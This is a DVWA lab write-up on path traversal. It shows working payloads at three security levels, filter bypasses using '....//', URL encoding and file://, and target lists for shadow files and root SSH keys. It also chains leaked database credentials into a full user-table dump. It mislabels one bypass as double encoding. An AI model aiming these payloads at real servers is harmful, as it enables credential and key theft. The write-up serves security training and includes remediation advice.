# Lab Write-Up: Directory Traversal (Path Traversal)
**Date:** 2026-09-25  
**Author:** Adinath Dubile  
**Lab Environment:** DVWA (Damn Vulnerable Web Application)  
**Difficulty Levels Tested:** Low | Medium | High  
**Category:** Broken Access Control  
**OWASP Top 10:** A01:2021 – Broken Access Control  

---

## 1. Introduction

Directory Traversal (also known as Path Traversal) is a vulnerability that allows an attacker to read files outside the intended web root directory by manipulating file path parameters with `../` sequences. This can expose sensitive files such as `/etc/passwd`, configuration files with database credentials, SSH private keys, and application source code.

**Goal of this lab:** Exploit path traversal in DVWA's file inclusion module to read arbitrary files from the server filesystem — including sensitive system and configuration files.

---

## 2. Environment Setup

| Component        | Details                                |
|------------------|----------------------------------------|
| **Target App**   | DVWA – File Inclusion / Traversal      |
| **Attacker OS**  | Kali Linux                             |
| **Tools Used**   | Browser, Burp Suite                    |
| **Network**      | Local lab (NAT/Host-Only)              |

---

## 3. Vulnerability Overview

### What is Directory Traversal?

The application uses a `page` parameter to load files:
```
http://localhost/dvwa/vulnerabilities/fi/?page=file.php
```

Without validation, an attacker changes `page` to traverse directories:
```
?page=../../../../etc/passwd
```

**How `../` traversal works:**
```
Starting at: /var/www/html/dvwa/vulnerabilities/fi/
../          → /var/www/html/dvwa/vulnerabilities/
../../       → /var/www/html/dvwa/
../../../    → /var/www/html/
../../../../ → /var/www/
../../../../../ → /var/
../../../../../../ → /
../../../../../../etc/passwd → /etc/passwd
```

---

## 4. Exploitation

### 4.1 Low Security Level

**Setup:** Navigate to DVWA → File Inclusion. Set security to **Low**.

#### Step 1 – Identify the Parameter

**Default URL:**
```
http://localhost/dvwa/vulnerabilities/fi/?page=include.php
```

#### Step 2 – Simple Traversal Test

**Payload:**
```
?page=../../../../etc/passwd
```

**Output:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:999:999::/var/lib/mysql:/bin/false
...
```

✅ Path traversal confirmed — `/etc/passwd` read successfully.

#### Step 3 – Enumerate Sensitive Files

**Read Linux shadow file (requires root):**
```
?page=../../../../etc/shadow
```

**Read SSH private key:**
```
?page=../../../../root/.ssh/id_rsa
```

**Read DVWA database config:**
```
?page=../../config/config.inc.php
```

**Output:**
```php
$_DVWA['db_server']   = '127.0.0.1';
$_DVWA['db_database'] = 'dvwa';
$_DVWA['db_user']     = 'dvwauser';
$_DVWA['db_password'] = 'p@ssw0rd';
```

✅ Database credentials exposed!

**Read Apache config:**
```
?page=../../../../etc/apache2/apache2.conf
```

**Read hosts file:**
```
?page=../../../../etc/hosts
```

**Read web server environment:**
```
?page=../../../../proc/self/environ
```

#### Step 4 – Enumerate via Burp Intruder

Automate file discovery:

1. Send the request to Burp Intruder
2. Mark `page=§../../../../etc/passwd§`
3. Payload list: common sensitive Linux paths:
   ```
   ../../../../etc/passwd
   ../../../../etc/shadow
   ../../../../etc/hosts
   ../../../../etc/hostname
   ../../../../etc/apache2/apache2.conf
   ../../../../var/log/apache2/access.log
   ../../../../var/log/apache2/error.log
   ../../../../root/.bash_history
   ../../../../root/.ssh/id_rsa
   ../../../../home/www-data/.bash_history
   ```
4. Filter by response length — longer responses = file found.

---

### 4.2 Medium Security Level

**Setup:** Set security to **Medium**.

**Observation:** `../` sequences are being filtered from the input.

#### Step 1 – Confirm Filter

```
?page=../../../../etc/passwd
```
→ No output — filter removes `../`

#### Step 2 – Bypass 1: Absolute Path

The filter removes `../` but may not block absolute paths:
```
?page=/etc/passwd
```

**Output:** `/etc/passwd` contents ✅

#### Step 3 – Bypass 2: Double Encoding

The filter runs once — double-encode the traversal sequence:
```
../ → ..%2F → %2E%2E%2F → %2E%2E/
```

**Payload:**
```
?page=....//....//....//....//etc/passwd
```

When the filter strips `../` from `....//`, it produces `../`:
```
....// → remove "../" → ../
```

**Output:** `/etc/passwd` contents ✅

#### Step 4 – Bypass 3: URL Encoding

```
?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

Decoded: `../../../../etc/passwd`

---

### 4.3 High Security Level

**Setup:** Set security to **High**.

**Observation:** Only files whose names start with `file` are accepted.

#### Step 1 – Use `file://` URI Scheme

```
?page=file:///etc/passwd
```

**Output:** `/etc/passwd` contents ✅

The filename starts with `file` → passes the filter, but reads the local file system!

#### Step 2 – Read Arbitrary Files via file://

```
?page=file:///var/www/html/dvwa/config/config.inc.php
?page=file:///etc/apache2/sites-enabled/000-default.conf
?page=file:///root/.ssh/id_rsa
?page=file:///proc/version
```

---

## 5. Chaining: Directory Traversal → Credential Theft → DB Access

```
Step 1: ?page=../../../../etc/passwd
        → Identify users: root, www-data, mysql

Step 2: ?page=../../config/config.inc.php
        → DB creds: dvwauser / p@ssw0rd

Step 3: Use creds to connect to MySQL:
        mysql -u dvwauser -p'p@ssw0rd' -h 127.0.0.1 dvwa

Step 4: Dump all tables:
        SELECT * FROM users;
        → All credential hashes extracted
```

---

## 6. High-Value Target Files (Linux)

| File                                   | Contents                        |
|----------------------------------------|---------------------------------|
| `/etc/passwd`                          | User accounts                   |
| `/etc/shadow`                          | Password hashes (needs root)    |
| `/etc/hosts`                           | Hostname/IP mapping             |
| `/etc/apache2/apache2.conf`            | Web server config               |
| `/var/log/apache2/access.log`          | Web access logs                 |
| `/var/www/html/dvwa/config/config.inc.php` | DB credentials             |
| `/root/.ssh/id_rsa`                    | Root SSH private key            |
| `/proc/self/environ`                   | Running process environment vars|
| `/proc/version`                        | Linux kernel version            |

---

## 7. Findings Summary

| Security Level | Vulnerable | Bypass Method            | Files Accessed          |
|----------------|------------|--------------------------|-------------------------|
| Low            | ✅ Yes     | Direct `../` traversal   | /etc/passwd, config     |
| Medium         | ✅ Yes     | Absolute path / `....//` | /etc/passwd, config     |
| High           | ✅ Yes     | `file://` URI scheme     | /etc/passwd, config     |

---

## 8. Impact Assessment

| Category       | Rating   |
|----------------|----------|
| **Severity**   | Critical |
| **CVSS Score** | 9.8      |
| **CIA Impact** | Confidentiality: High, Integrity: Medium, Availability: Low |

**Business Impact:**
- Exposure of system user accounts and password hashes
- Database credential theft leading to full DB compromise
- SSH private key theft enabling server takeover
- Source code disclosure revealing further vulnerabilities
- Compliance violations (unauthorized access to sensitive data)

---

## 9. Remediation Recommendations

| Fix                           | Description                                                      |
|-------------------------------|------------------------------------------------------------------|
| **Input Validation**          | Reject any input containing `../`, `./`, null bytes, URI schemes|
| **Realpath + Basepath Check** | Resolve the full path and ensure it's within the allowed dir    |
| **Whitelist Allowed Files**   | Only allow specific known filenames                              |
| **Chroot / open_basedir**     | Restrict PHP to only access files within web root               |
| **Least Privilege**           | Web server should not have read access to `/etc/shadow`, SSH keys|

**Secure Code (PHP):**
```php
// Vulnerable
include($_GET['page']);

// Secure – real path check
$base_dir = realpath('/var/www/html/dvwa/pages/');
$requested = realpath($base_dir . '/' . $_GET['page']);

// Ensure the resolved path is within the allowed base directory
if ($requested === false || strpos($requested, $base_dir) !== 0) {
    die('Access denied: Path traversal detected');
}
include($requested);
```

---

## 10. References

- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [PortSwigger – Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [DVWA File Inclusion Walkthrough – ch3ngo](https://ch3ngo.github.io/posts/file-inclusion_dvwa_walkthrough/)
- [PayloadAllTheThings – Path Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)

---

## 11. Proof of Concept (PoC) Summary

```
Target:    DVWA – File Inclusion Module (Path Traversal)
Low:       ?page=../../../../etc/passwd → Full file contents returned
Medium:    ?page=/etc/passwd → Absolute path bypass
High:      ?page=file:///etc/passwd → URI scheme bypass
Sensitive: ?page=../../config/config.inc.php → DB credentials exposed
Severity:  CRITICAL (CVSS 9.8)
```

---

*Write-up created for portfolio/educational purposes only. All testing performed in an isolated lab environment.*
